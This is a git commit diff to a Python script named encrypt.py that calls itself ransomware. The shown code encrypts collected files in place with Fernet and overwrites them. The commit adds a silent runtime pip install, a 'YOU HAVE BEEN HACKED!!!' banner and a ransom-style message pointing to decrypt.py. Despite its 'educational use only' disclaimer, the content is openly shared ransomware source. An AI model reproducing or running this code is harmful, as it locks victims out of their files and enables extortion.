2a58c48c480a1761f63f9eab2353a96332831aa7
Sleety Matt George <70995581+WhiteHatCyberus@users.noreply.github.com>
2022-09-14 16:24:33 +0530

    Update encrypt.py

--- Fernet_python/encrypt.py
+++ Fernet_python/encrypt.py
@@ -1,4 +1,7 @@
-﻿import os
+import os
+import subprocess
+import time
+subprocess.run(["python", "-m", "pip", "install", "cryptography"])
 from cryptography.fernet import Fernet
 #Disclaimer: For educational use  only
 files = []
@@ -16,5 +19,7 @@ for file in files:
 	contents_encrypted = Fernet(key).encrypt(contents)
 	with open(file, "wb") as thefile:
 		thefile.write(contents_encrypted)
+print("YOU HAVE BEEN HACKED!!! \n")
 print("Hello dear user, this file is a ransomware and has encrypted your files in a 128 bit AES encryption, if you have been subjected to an attack via this file, please be aware this has been done by a script kiddy.if you wish to decrypt your files safely, please run decrypt.py")
-print(" \n This was made for educationl purposes only by WhiteHatCyberus ") 
+print(" \n This was made for educational purposes only by WhiteHatCyberus ") 
+time.sleep(4)
